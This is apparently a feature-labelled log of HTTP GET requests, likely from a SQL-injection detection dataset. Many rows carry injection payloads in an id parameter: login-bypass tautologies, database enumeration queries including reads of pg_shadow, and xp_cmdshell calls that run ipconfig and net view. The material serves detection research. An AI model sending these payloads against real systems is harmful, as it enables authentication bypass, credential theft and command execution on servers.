13,1,200,3996,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4888,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7680,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1968,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2686,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4542,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6003,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7709,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6307,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3649,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5489,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4755,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3073,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5161,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7232,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4493,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6038,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6857,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4363,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4415,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7210,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1866,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7196,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7291,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5966,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1212,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2521,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7016,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4177,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3607,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6990,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6550,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3231,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2884,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3804,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1535,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3162,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3571,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6273,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4216,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3258,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3335,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2107,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3922,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5495,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5948,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6265,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5343,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7906,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4380,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4542,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2968,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1533,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6761,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6923,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6669,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6276,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6408,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4426,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7971,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3385,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1916,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2399,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7846,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7714,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4125,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4726,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1840,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1886,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6172,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6704,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4128,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2763,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1189,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3141,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3366,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5677,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3748,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4516,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4386,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1407,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4145,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3071,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7427,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4484,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6347,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3300,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7559,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5349,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2629,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7472,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3258,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5019,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3664,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2243,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1453,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2182,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6953,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2541,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2117,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2511,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5424,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3492,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1869,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6348,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6662,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2698,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2398,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2265,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2160,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3374,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2803,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5115,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2038,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4763,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6251,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5230,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6379,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3115,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6237,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1721,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1034,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5508,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3677,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1907,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7835,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5614,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5672,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6125,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7906,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4356,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5508,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5230,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1191,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1618,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1038,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4754,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2650,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1245,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1157,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6349,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1170,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6505,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2157,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7444,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4105,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1311,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3459,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6837,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6646,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1024,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6998,7,0,1,1,0,GET  HTTP/1.1
81,1,200,6941,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,1742,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,1145,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,2783,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,5861,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
38,1,200,5733,7,9,12,2,1,GET ?id=admin') or ('1'='1'/* HTTP/1.1
38,1,200,2948,7,9,12,2,1,GET ?id=admin') or ('1'='1'/* HTTP/1.1
34,1,200,2027,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,3539,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,1193,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,1298,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
30,1,200,7626,7,4,6,1,1,GET ?id=") or ("1"="1 HTTP/1.1
30,1,200,3003,7,4,6,1,1,GET ?id=") or ("1"="1 HTTP/1.1
30,1,200,5177,7,4,6,1,1,GET ?id=") or ("1"="1 HTTP/1.1
30,1,200,4459,7,4,6,1,1,GET ?id=") or ("1"="1 HTTP/1.1
25,1,200,5092,7,8,3,1,1,GET ?id= or true HTTP/1.1
36,1,200,4761,7,9,10,2,1,GET ?id=admin' or '1'='1'/* HTTP/1.1
36,1,200,7034,7,9,10,2,1,GET ?id=admin' or '1'='1'/* HTTP/1.1
40,1,200,4869,7,16,8,2,1,GET login/?id=' and 'one'='one¡V HTTP/1.1
40,1,200,5533,7,16,8,2,1,GET login/?id=' and 'one'='one¡V HTTP/1.1
40,1,200,7341,7,16,8,2,1,GET login/?id=' and 'one'='one¡V HTTP/1.1
43,1,200,1001,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,5713,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,5739,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,3091,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
47,1,200,6204,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,6317,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,7073,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,3439,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,6364,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,2864,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
62,1,200,2087,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,5348,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,3476,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,1559,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,3069,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,5933,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,5302,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,7161,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,4700,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,5133,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,7472,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
26,1,200,5875,7,4,5,1,1,GET ?id=' or 1=1¡V HTTP/1.1
26,1,200,4672,7,4,5,1,1,GET ?id=' or 1=1¡V HTTP/1.1
26,1,200,1134,7,4,5,1,1,GET ?id=' or 1=1¡V HTTP/1.1
32,1,200,4770,7,9,4,2,0,GET login/?id= or 0=0 ¡V HTTP/1.1
32,1,200,2811,7,9,4,2,0,GET login/?id= or 0=0 ¡V HTTP/1.1
35,1,200,6459,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,3062,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,7684,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,2424,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,3603,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,2723,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,7445,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,7621,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
32,1,200,6491,7,9,4,2,1,GET login/?id=" or 1=1¡V HTTP/1.1
32,1,200,7113,7,9,4,2,1,GET login/?id=" or 1=1¡V HTTP/1.1
32,1,200,4188,7,9,4,2,1,GET login/?id=" or 1=1¡V HTTP/1.1
65,1,200,1770,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,3746,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
81,1,200,6742,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,4990,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,7210,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
25,1,200,5020,7,5,4,1,0,GET ?id= and 1=1 HTTP/1.1
25,1,200,2672,7,5,4,1,0,GET ?id= and 1=1 HTTP/1.1
41,1,200,1549,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,7965,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,5811,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,3148,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,1700,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,1581,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,1019,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,3923,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,6702,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
34,1,200,2725,7,9,7,2,1,GET login/?id=' or '1¡¬='1 HTTP/1.1
41,1,200,5937,7,9,6,2,1,GET login/?id=' or         0=0 # HTTP/1.1
41,1,200,1012,7,9,6,2,1,GET login/?id=' or         0=0 # HTTP/1.1
28,1,200,7948,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
28,1,200,3287,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
69,1,200,6285,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,1436,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,2093,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,2696,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,7444,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
33,1,200,4227,7,9,6,2,1,GET login/?id=' or 0=0 # HTTP/1.1
33,1,200,2585,7,9,6,2,1,GET login/?id=' or 0=0 # HTTP/1.1
67,1,200,3807,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,7569,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,4924,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,7606,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,6951,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,4105,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,3657,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,5017,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,2989,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,5363,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,5017,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,6742,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,5445,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,5646,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
26,1,200,4124,7,7,4,2,1,GET login/?id="^" HTTP/1.1
37,1,200,5729,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,7081,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,2744,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,7590,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,2120,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,2461,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,4909,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,7854,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,1843,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,7987,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
34,1,200,2889,7,12,6,1,1,GET ?id=' or user like '% HTTP/1.1
34,1,200,7373,7,12,6,1,1,GET ?id=' or user like '% HTTP/1.1
34,1,200,1455,7,12,6,1,1,GET ?id=' or user like '% HTTP/1.1
64,1,200,1944,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,1175,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,1232,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,2722,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,2286,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,3948,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
52,1,200,5799,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,7117,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,4572,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,2178,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,4322,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,4892,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,1252,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
59,1,200,1395,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,2411,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,7885,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,4737,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,4609,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,5671,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
56,1,200,5031,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,3657,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,5793,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,5225,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,7137,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,1434,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,1725,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,6147,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,4228,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,1318,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
54,1,200,1925,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,5878,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,1663,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,4660,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,4341,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,6598,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,6081,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
